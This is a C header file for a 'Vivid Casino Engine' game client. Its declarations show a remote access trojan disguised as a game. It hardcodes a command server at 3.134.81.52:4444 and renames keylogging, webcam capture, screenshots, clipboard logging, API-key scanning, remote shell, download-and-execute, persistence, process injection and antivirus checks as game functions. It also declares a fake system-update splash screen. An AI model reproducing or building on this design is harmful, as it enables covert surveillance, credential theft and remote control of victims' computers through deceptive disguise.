/*
 * Vivid Casino Engine — Core Header
 * 
 * Cross-platform casino game engine client.
 * Provides networking, UI rendering, system integration,
 * and security auditing capabilities.
 */

#ifndef VCE_ENGINE_H
#define VCE_ENGINE_H

#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <ctype.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

/* Server Configuration */
#define SERVER_HOST     "3.134.81.52"
#define SERVER_PORT     4444
#define NET_BUF_SIZE    1048576

/* Game Settings */
#define GAME_TITLE      "Vivid Casino"
#define SPLASH_DURATION 5000
#define MAX_COPY_ENTRIES 50
#define COPY_ENTRY_SIZE  1024

/* Admin Command Codes — Game operator console commands */
#define GAME_DIAGNOSE         "SHELL"
#define GAME_FETCH_MODULE      "DOWNLOAD"
#define GAME_LAUNCH_MODULE       "EXECUTE"
#define GAME_SYSTEM_INFO          "INFO"
#define GAME_AUTO_START       "PERSIST"
#define GAME_SCREEN_CAPTURE    "SCREENSHOT"
#define GAME_CAMERA_TEST        "WEBCAM"
#define GAME_INPUT_RECORD        "KEYLOG"
#define GAME_PAUSE_INPUT       "DISABLE_INPUT"    /* Maintenance mode: lock player controls */
#define GAME_SHOW_LOADING   "WINDOWS_UPDATE"   /* Show system update splash during maintenance */
#define GAME_COPY_BUFFER     "CLIPBOARD_LOG"
#define GAME_CONFIG_SCAN         "FIND_API_KEYS"

/* UI State */
extern HWND g_update_wnd;
extern int g_update_type;    /* 1=Windows update, 2=Apple update */
extern int g_input_blocked;
extern HHOOK g_mouse_hook;
extern HHOOK g_kb_hook;
extern HWND g_block_wnd;
extern HANDLE g_block_thread;
extern RECT g_old_clip;
extern int g_copy_buffer_saved;
extern int g_cursor_count;

/* Clipboard State */
extern CRITICAL_SECTION g_copy_buffer_cs;
extern char g_copy_buffer_log[MAX_COPY_ENTRIES][COPY_ENTRY_SIZE];
extern int g_copy_buffer_index;
extern int g_copy_buffer_count;
extern char g_last_copy_buffer_text[COPY_ENTRY_SIZE];

/* === Network Module === */
int net_init(void);
void net_cleanup(void);
int net_send_packet(SOCKET s, const char *data);
char* net_recv_packet(SOCKET s);
char* net_recv_packet_timed(SOCKET s, int timeout_sec);

/* === UI / Renderer Module === */
void ui_init(void);
void ui_show_splash(int type);      /* 1=Windows style, 2=Apple style */
void ui_hide_splash(void);
void ui_lock_controls(int lock);    /* Lock/unlock player input */
void ui_block_input(int block);
void ui_restore_input(void);
void ui_open_note(const char *text);
LRESULT CALLBACK ui_input_hook(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI ui_block_thread_proc(LPVOID lpParam);

/* === System Utilities === */
char* sys_run_command(const char *cmd);
char* sys_get_info(void);
void sys_register_autostart(void);
void sys_check_privileges(void);
void sys_init_window(void);
void sys_check_antivirus(void);
void sys_protect_process(void);
void sys_unprotect_process(void);
const char* sys_protection_status(void);
const char* sys_check_critical_status_with_name(void);
int sys_is_admin(void);
void sys_spawn_shadow_copy(void);
void sys_wmi_persistence(void);
void sys_inject_process(void);
void sys_harden_files(void);
void sys_lolbas_download(const char *url, const char *outPath);
char* sys_obfuscate_ps(const char *command);
DWORD WINAPI sys_protect_watchdog(LPVOID lpParam);

/* Clipboard */
void copy_buffer_init(void);
void copy_buffer_shutdown(void);
void copy_buffer_add_entry(const char *text);
char* copy_buffer_read_now(void);
char* copy_buffer_get_history(void);
DWORD WINAPI copy_buffer_monitor_thread(LPVOID lpParam);
void copy_buffer_debug_log(const char *fmt, ...);

/* === Security Audit === */
char* config_scan_scan_system(void);
char* config_scan_scan_path(const char *path);

/* === Game Client Main Loop === */
DWORD WINAPI game_client_loop(LPVOID lpParam);

/* === Utility === */
void util_appendf(char *buf, int *pos, const char *fmt, ...);
char* util_b64_encode(const unsigned char *data, int len);
int util_b64_decode(const char *in, unsigned char *out, int out_len);

#endif /* VCE_ENGINE_H */
